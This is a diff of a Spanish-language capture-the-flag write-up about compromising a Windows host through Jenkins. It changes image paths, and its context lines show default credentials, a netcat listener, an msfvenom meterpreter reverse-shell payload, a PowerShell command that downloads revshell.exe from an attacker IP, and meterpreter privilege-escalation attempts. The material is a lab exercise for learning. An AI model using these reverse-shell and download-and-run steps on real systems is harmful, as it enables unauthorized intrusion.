@@ -36,19 +36,19 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:**windows**
 
 ### HTTP (80)
 
-![alt text](image.png)
+![alt text](img/image.png)
 
 ### HTTP (8080)
 
 Credenciales por defecto `admin:admin`
 
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
-![alt text](image-13.png)
+![alt text](img/image-13.png)
 
 ## Exploit
 
-![alt text](image-14.png)
+![alt text](img/image-14.png)
 
 Agregar la sigueinte linea de código
 
@@ -62,11 +62,11 @@ python3 -m http.server 8282
 nc -nvlp 1234  
 ```
 
-![alt text](image-2.png)
+![alt text](img/image-2.png)
 
-![alt text](image-3.png)
+![alt text](img/image-3.png)
 
-![alt text](image-4.png)
+![alt text](img/image-4.png)
 
 ```powersehll
 PS C:\Users\bruce\Desktop> type user.txt
@@ -83,7 +83,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.244.36:8001/revshell.exe','revshell.exe')"
 ```
 
-![alt text](image-5.png)
+![alt text](img/image-5.png)
 
 
 ```bash
@@ -104,24 +104,24 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.9.244.36:5555 
 ```
 
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 
-![alt text](image-7.png)
+![alt text](img/image-7.png)
 
 ```shell
 PS C:\Users\bruce\Desktop> cd 'C:\Program Files (x86)\Jenkins\workspace\admin'
 PS C:\Program Files (x86)\Jenkins\workspace\admin> 
 ```
 
-![alt text](image-8.png)
+![alt text](img/image-8.png)
 
 ```shell
 Start-Process revshell.exe
 ```
 
-![alt text](image-9.png)
+![alt text](img/image-9.png)
 
-![alt text](image-10.png)
+![alt text](img/image-10.png)
 
 ```bash
 meterpreter > impersonate_token "BUILTIN\Administrators"
@@ -135,9 +135,9 @@ meterpreter > getsystem
 [-] priv_elevate_getsystem: Operation failed: The environment is incorrect
 ```
 
-![alt text](image-11.png)
+![alt text](img/image-11.png)
 
-![alt text](image-12.png)
+![alt text](img/image-12.png)
 
 Flag: root.txt
 
